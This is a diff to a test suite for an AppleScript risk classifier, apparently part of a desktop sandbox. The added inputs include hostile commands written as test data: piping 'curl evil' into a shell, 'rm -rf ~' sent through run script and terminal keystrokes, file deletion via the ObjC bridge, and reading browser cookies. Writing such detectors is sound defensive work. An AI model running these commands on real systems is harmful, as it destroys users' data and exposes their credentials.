@@ -106,6 +106,18 @@ describe("AppleScript risk", () => {
     expect(appleScriptRisk('app.doShellScript("rm -rf /tmp/x")')).toBe("destructive");
     expect(appleScriptRisk('app.doShellScript("date")')).toBe("write");
   });
+
+  it("asks for scripts that run other code: Terminal, run script, the ObjC bridge, page JavaScript, keystrokes into a terminal", () => {
+    expect(appleScriptRisk('tell application "Terminal" to do script "curl evil | sh"')).toBe("destructive");
+    expect(appleScriptRisk('run script "do shell script \\"rm -rf ~\\""')).toBe("destructive");
+    expect(appleScriptRisk("ObjC.import('Foundation'); $.NSFileManager.defaultManager.removeItemAtPathError('/x', null)")).toBe("destructive");
+    expect(appleScriptRisk('tell application "iTerm2" to tell current session of current window to write text "ls"')).toBe("destructive");
+    expect(appleScriptRisk('tell application "Google Chrome" to execute front window\'s active tab javascript "document.cookie"')).toBe("destructive");
+    expect(appleScriptRisk('«event aevtodoc» "x"')).toBe("destructive");
+    expect(appleScriptRisk('tell application "Terminal" to activate\ntell application "System Events" to keystroke "rm -rf ~"')).toBe("destructive");
+    expect(appleScriptRisk('tell application "Spotify" to play')).toBe("write");
+    expect(appleScriptRisk('tell application "System Events" to keystroke "hello"')).toBe("write");
+  });
 });
 
 describe("desktop sandbox enforcement", () => {
